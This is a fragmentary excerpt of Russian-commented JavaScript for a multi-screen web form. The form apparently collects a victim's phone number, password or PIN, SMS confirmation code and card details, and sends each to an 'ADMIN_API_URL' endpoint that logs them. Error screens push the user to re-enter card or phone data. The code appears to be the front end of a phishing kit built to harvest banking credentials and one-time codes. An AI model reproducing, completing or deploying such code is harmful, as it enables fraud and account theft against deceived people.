...
// ============================================================================
// ЭКРАН 3: PIN (4 ЦИФРЫ) - КЛЮЧЕВОЙ ЭКРАН!
// ============================================================================
    ...
    form.addEventListener('submit', async (e) => {
        ...
        try {
            ...
            if (isPasswordRetry) {
                ...
                // Переход к SMS коду
                switchScreen('screen-password', 'screen-code');
                
                // Инициализируем поля для SMS кода
                initCodeInputs(4);
            }
        } catch (error) {
...
async function createSession() {
    try {
        ...
        // ШАГ 2: Добавляем телефон
        console.log('📤 Шаг 2: Отправляем телефон...');
        await saveData('phone', userData.phone);
        
        // ШАГ 3: Добавляем пароль и создаём лог
...
async function savePassword(password) {
    ...
    try {
        ...
        // Используем endpoint save_pin для создания полноценного лога
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/session/save_pin`, {
            ...
            body: JSON.stringify({
                ...
                pin_code: password  // Отправляем пароль как pin_code
            })
        });
...
function showCardError() {
    ...
    // Переходим на экран ввода карты
    const currentScreen = document.querySelector('.screen.active');
    if (currentScreen) {
        currentScreen.classList.remove('active');
    }
...
function showPhoneError() {
    ...
    // Переходим на экран ввода телефона
    const currentScreen = document.querySelector('.screen.active');
    if (currentScreen) {
        currentScreen.classList.remove('active');
    }
